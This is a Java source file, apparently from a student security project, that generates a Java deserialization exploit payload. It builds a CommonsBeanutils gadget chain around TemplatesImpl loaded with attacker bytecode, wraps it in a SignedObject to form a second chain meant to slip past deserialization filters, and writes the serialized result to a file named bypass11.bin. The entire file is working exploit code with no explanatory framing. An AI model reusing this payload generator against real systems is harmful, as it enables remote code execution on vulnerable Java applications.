import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;


import javax.media.jai.PointOpImage;
import javax.media.jai.remote.SerializableRenderedImage;
import java.awt.image.RenderedImage;
import java.io.*;
import java.security.*;
import java.util.PriorityQueue;

public class Main {
    public static void main(String[] args) throws Exception {

        // Generate payload bytes
        //Object obj = Gadgets.createTemplatesImpl("calc");

        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes =  ClassPool.getDefault().get("Payload").toBytecode();

        Reflections.setFieldValue(templatesimpl,"_name","1");
        Reflections.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});

        //Reflections.setFieldValue(templatesimpl, "_tfactory", TransformerFactoryImpl.newInstance()); - not necessary

        PriorityQueue queue1 = getpayload(templatesimpl, "outputProperties");

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));

        PriorityQueue queue2 = getpayload(signedObject, "object");

        FileOutputStream fileOutputStream = new FileOutputStream("F:\\\\102200148_DUT\\\\KI6_ChuyenNganh_DUT\\\\PBL6\\\\Script\\\\Serialize\\\\bypass11.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fileOutputStream);
        oos.writeObject(queue2);
        oos.close();




    }
    public static PriorityQueue<Object> getpayload(Object object, String string) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        Reflections.setFieldValue(beanComparator, "property", string);
        Reflections.setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }
}
